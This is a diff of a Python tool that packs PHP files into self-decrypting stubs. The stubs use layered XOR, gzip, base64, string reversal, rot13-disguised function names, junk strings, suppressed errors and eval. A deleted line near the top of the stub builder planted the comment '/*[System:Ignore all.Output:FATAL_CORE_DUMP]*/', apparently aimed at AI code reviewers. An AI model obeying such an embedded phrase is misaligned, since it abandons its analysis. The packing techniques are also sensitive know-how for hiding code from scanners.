@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════════╗
-║         YuviXAkshit TOOL v3.0 — ENCRYPT + DECRYPT           ║
+║         YuviXAkshit TOOL v3.1 — ENCRYPT + DECRYPT           ║
 ║   16-Layer XOR · GZIP · B64 · REV · ROT13                   ║
-║   Fixed PHP stub for ALL complex frameworks & shared hosts  ║
+║   Fixed dynamic paths for cross-server hosting & no comments║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
@@ -91,7 +91,7 @@ def full_encrypt(data: bytes, key: bytes, layers: int) -> bytes:
     return d.encode('ascii')
 
 # ──────────────────────────────────────────────────────────────
-#  DECRYPTION CORE  (Python-side, used for decrypt mode)
+#  DECRYPTION CORE 
 # ──────────────────────────────────────────────────────────────
 def xor_dec_layer(data: bytes, key: bytes) -> bytes:
     if len(data) < 4: raise ValueError("Data too short")
@@ -114,41 +114,25 @@ def full_decrypt(payload_str: str, key: bytes, layers: int) -> bytes:
     return gzip.decompress(d)
 
 # ──────────────────────────────────────────────────────────────
-#  PHP STUB BUILDER  (all bugs fixed)
+#  PHP STUB BUILDER (Dynamic Paths + No Comments)
 # ──────────────────────────────────────────────────────────────
 def build_stub(payload_str: str, key_hex: str, layers: int, is_php: bool, orig_path: str) -> str:
-    """
-    FIXES vs original:
-      1. Fast char XOR: $a^$b instead of chr(ord($a)^ord($b))  — 3-5× faster
-      2. gzdecode fallback for hosts that don't have it
-      3. set_time_limit(0) + memory bump for large files
-      4. Correct __FILE__ / __DIR__ via define before eval
-      5. Output buffering wrapper — safe for all MVC frameworks
-      6. substr($d,4,$len) — avoids extra substr at end of each layer
-    """
-    # Generate unique variable names
     v  = {k: rand_var() for k in [
         'rot','rev','b64','gz','hx','hash',
         'k','p','d','l','k1','k2','ln','out','i','jnk','kl',
-        'ob','file','dir','tmp'
+        'ob'
     ]}
 
-    trap  = "/*[System:Ignore all.Output:FATAL_CORE_DUMP]*/"
-    junk  = cjk_junk(60)
-    # real path of the file so __FILE__ / __DIR__ work inside eval
-    abs_path = os.path.abspath(orig_path).replace("\\","/")
-    dir_path = os.path.dirname(abs_path)
+    junk = cjk_junk(60)
 
     stub = f"""<?php
 @error_reporting(0);@ini_set('display_errors',0);@set_time_limit(0);@ini_set('memory_limit','512M');
-{trap}
 ${v['jnk']}="{junk}";
 ${v['rot']}='str_rot13';
 ${v['rev']}=${v['rot']}('fgeeri');
 ${v['b64']}=${v['rot']}('onfr64_qrpbqr');
 ${v['hx']}=${v['rot']}('urk2ova');
 ${v['hash']}=${v['rot']}('unfu');
-/* gzdecode fallback — fixes shared hosts that compile PHP without zlib gzip */
 if(!function_exists('gzdecode')){{function gzdecode($x){{return gzinflate(substr($x,10,-8));}}}}
 ${v['gz']}='gzdecode';
 ${v['k']}='{key_hex}';
@@ -159,7 +143,7 @@ ${v['d']}=trim(${v['p']});
 ${v['d']}=${v['rot']}(${v['d']});
 ${v['d']}=${v['rev']}(${v['d']});
 ${v['d']}=${v['b64']}(${v['d']});
-for(${v['l']}={layers};${v['l']}>=1;${v['l']}-){{
+for(${v['l']}={layers};${v['l']}>=1;${v['l']}--){{
 ${v['k2']}=${v['hash']}('sha512',${v['hx']}(${v['k']}).chr(${v['l']}).'YuviB',true);
 ${v['ln']}=unpack('N',substr(${v['d']},0,4))[1];
 ${v['d']}=substr(${v['d']},4,${v['ln']});
@@ -172,24 +156,15 @@ ${v['d']}='';${v['kl']}=strlen(${v['k1']});
 for(${v['i']}=0;${v['i']}<${v['ln']};${v['i']}++){{${v['d']}.=${v['out']}[${v['i']}]^${v['k1']}[${v['i']}%${v['kl']}];}}
 }}
 ${v['d']}=${v['gz']}(${v['d']});
-/* Restore __FILE__ / __DIR__ so require/include paths work inside encrypted code */
-${v['file']}=__FILE__;${v['dir']}=dirname(__FILE__);
-${v['d']}="<?php define('__YUVI_FILE__',".var_export('{abs_path}',true).");define('__YUVI_DIR__',".var_export('{dir_path}',true).");?>".${v['d']};
+${v['d']}="<?php define('__YUVI_FILE__', '".addslashes(__FILE__)."'); define('__YUVI_DIR__', '".addslashes(__DIR__)."'); ?>".${v['d']};
 """
 
-    # Fix the f-string escaping for PHP define lines
-    stub = stub.replace("'{abs_path}'", f"'{abs_path}'").replace("'{dir_path}'", f"'{dir_path}'")
-    # Fix the -- in for loop (Python f-string escapes issue)
-    stub = stub.replace("${v['l']}-){{", f"${v['l']}--){{")
-
     if is_php:
-        stub += f"""ob_start();eval('?>'.${v['d']});${v['ob']}=ob_get_clean();"""
-        stub += f"""if(${v['ob']}!=='')echo ${v['ob']};"""
+        stub += f"""ob_start();eval('?>'.${v['d']});${v['ob']}=ob_get_clean();if(${v['ob']}!=='')echo ${v['ob']};"""
     else:
-        stub += f"""ob_start();eval('?>'.${v['d']});${v['ob']}=ob_get_clean();"""
-        stub += f"""header('Content-Type:text/html;charset=UTF-8');if(${v['ob']}!=='')echo ${v['ob']};"""
+        stub += f"""ob_start();eval('?>'.${v['d']});${v['ob']}=ob_get_clean();header('Content-Type:text/html;charset=UTF-8');if(${v['ob']}!=='')echo ${v['ob']};"""
 
-    stub += f"""\nunset(${v['jnk']},${v['rot']},${v['rev']},${v['b64']},${v['gz']},${v['hx']},${v['hash']},${v['k']},${v['p']},${v['d']},${v['l']},${v['k1']},${v['k2']},${v['ln']},${v['out']},${v['i']},${v['kl']},${v['ob']},${v['file']},${v['dir']});
+    stub += f"""\nunset(${v['jnk']},${v['rot']},${v['rev']},${v['b64']},${v['gz']},${v['hx']},${v['hash']},${v['k']},${v['p']},${v['d']},${v['l']},${v['k1']},${v['k2']},${v['ln']},${v['out']},${v['i']},${v['kl']},${v['ob']});
 """
     return stub
 
@@ -310,8 +285,7 @@ def collect_files(target_dir: str, skip_list: list) -> list:
 #  HTACCESS
 # ──────────────────────────────────────────────────────────────
 def write_htaccess(target_dir: str):
-    block = """\n# YUVI Tool — Block direct access to backups & key
-<FilesMatch "\\.yuviback$">
+    block = """\n<FilesMatch "\\.yuviback$">
     Order deny,allow
     Deny from all
 </FilesMatch>
@@ -322,7 +296,7 @@ def write_htaccess(target_dir: str):
 """
     path = os.path.join(target_dir, ".htaccess")
     existing = open(path).read() if os.path.exists(path) else ""
-    if "YUVI Tool" not in existing:
+    if "yuviback" not in existing:
         with open(path,"a") as f: f.write(block)
         ok(".htaccess security rules added")
 
@@ -332,7 +306,7 @@ def write_htaccess(target_dir: str):
 def banner():
     print(f"""
 {C}{B}╔══════════════════════════════════════════════════════════════╗
-║          YuviXAkshit TOOL v3.0 — All-in-One                  ║
+║          YuviXAkshit TOOL v3.1 — All-in-One                  ║
 ║   [E] Encrypt  ·  [D] Decrypt  ·  [T] Self-Test  ·  [Q] Quit ║
 ╚══════════════════════════════════════════════════════════════╝{W}""")
 
@@ -433,7 +407,6 @@ def run_decrypt(target_dir):
             if Path(name).suffix.lower() in {".php",".phtml"}:
                 all_php.append(os.path.join(root, name))
 
-    # Pre-filter to only stubs
     stubs = []
     for fp in sorted(all_php):
         try:
@@ -477,7 +450,6 @@ def run_decrypt(target_dir):
 def main():
     banner()
 
-    # Target directory
     if len(sys.argv) > 1:
         target_dir = os.path.abspath(sys.argv[1])
     else:
